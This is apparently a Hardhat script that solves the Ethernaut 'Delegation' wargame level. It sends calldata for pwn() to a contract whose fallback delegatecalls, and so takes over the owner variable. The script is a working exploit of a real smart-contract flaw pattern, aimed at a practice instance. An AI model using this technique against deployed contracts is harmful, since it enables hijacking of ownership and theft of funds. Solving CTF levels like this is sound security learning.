import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0xa31A53DcB988a99815E581927020Fa1a0dD59920";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  // const Delegate = await ethers.getContractFactory("Delegate");
  // const delegate = await Delegate.attach(INSTANCE_ADDRESS);
  // await delegate.deployed();

  const Contract = await ethers.getContractFactory("Delegation");
  const contract = await Contract.attach(INSTANCE_ADDRESS);
  await contract.deployed();

  console.log(await contract.owner());

  const abi = ["function pwn()"];
  const iDelegate = new ethers.utils.Interface(abi);
  await me.sendTransaction({
    to: contract.address,
    data: iDelegate.encodeFunctionData("pwn"),
    // need to seed more gas to set the owner variable
    gasLimit: ethers.utils.parseUnits("1000000", "wei"),
  });

  console.log(await contract.owner());

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
